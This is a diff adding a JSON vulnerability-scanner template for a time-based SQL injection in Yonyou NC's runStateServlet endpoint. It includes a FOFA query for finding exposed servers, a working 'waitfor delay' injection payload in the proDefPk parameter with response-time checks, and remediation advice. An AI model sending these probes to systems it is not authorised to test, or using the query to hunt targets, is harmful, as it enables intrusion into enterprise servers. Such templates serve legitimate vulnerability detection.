@@ -1,0 +1,65 @@
+{
+  "product": "用友NC",
+  "vul_name": "用友NC runStateServlet-proDefPk SQL注入",
+  "type": "SQL注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友NC /portal/pt/servlet/runStateServlet接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。",
+  "version": "用友网络科技股份有限公司-NC version<=6.5",
+  "note": "",
+  "search": {
+    "FOFA": "icon_hash=\"1085941792\" && body=\"/logo/images/logo.gif\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_39894062/article/details/137752551",
+  "fix": [
+    "关闭互联网暴露面或接口设置访问权限",
+    "升级至安全版本"
+  ],
+  "exploit": [
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:8'--",
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": ">=",
+              "num": 8
+            }
+          }
+        ]
+      }
+    },
+    {
+      "exp": {
+        "method": "get",
+        "follow": false,
+        "path": "/portal/pt/servlet/runStateServlet/doPost?pageId=login&proDefPk=1'waitfor+delay+'0:0:0'--",
+        "header": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      },
+      "verify": {
+        "path": "",
+        "logic": "and",
+        "check": [
+          {
+            "time": {
+              "check": "<=",
+              "num": 7
+            }
+          }
+        ]
+      }
+    }
+  ]
+}
